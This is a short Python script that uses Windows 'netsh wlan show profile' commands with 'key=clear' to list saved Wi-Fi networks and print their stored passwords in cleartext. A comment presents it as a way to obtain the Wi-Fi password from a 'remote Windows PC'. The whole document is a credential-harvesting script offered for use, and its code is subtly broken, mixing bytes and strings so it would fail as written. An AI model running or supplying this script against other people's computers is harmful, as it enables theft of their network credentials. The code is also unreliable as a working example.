import re
import subprocess

command = "netsh wlan show profile" # With this script you can obtain the wifi pass from the remote Windows PC.
networks = subprocess.check_output(command, shell=True)
networks_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output = ""

for network in networks_list:
	command = f"netsh wlan show profile {network} key=clear"
	result = subprocess.check_output(command, shell=True)
	output += result
	print(f"{network} - {result}")
